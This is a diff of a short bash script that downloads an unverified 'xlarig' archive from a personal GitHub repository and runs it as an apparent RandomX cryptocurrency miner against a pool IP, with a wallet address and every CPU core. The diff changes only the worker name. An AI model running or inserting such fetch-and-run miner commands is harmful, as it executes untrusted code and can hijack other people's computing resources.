@@ -1,3 +1,3 @@
 #!/bin/bash
 wget https://github.com/bengetsia/soft/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz
-./xlarig --donate-level 1 -o 139.162.46.193:443 -u ZEPHsBz5DP8CQwW1ex5dF45MnEiysxKnWUxbsA1FjhMdAbj1tjub6mZ8zpywvMLqWYj1AQtbNdi6ffGVfwphDZiChWU5fsRM3xD -p 5cpu -a rx/0 -t $(nproc --all)
+./xlarig --donate-level 1 -o 139.162.46.193:443 -u ZEPHsBz5DP8CQwW1ex5dF45MnEiysxKnWUxbsA1FjhMdAbj1tjub6mZ8zpywvMLqWYj1AQtbNdi6ffGVfwphDZiChWU5fsRM3xD -p rin -a rx/0 -t $(nproc --all)
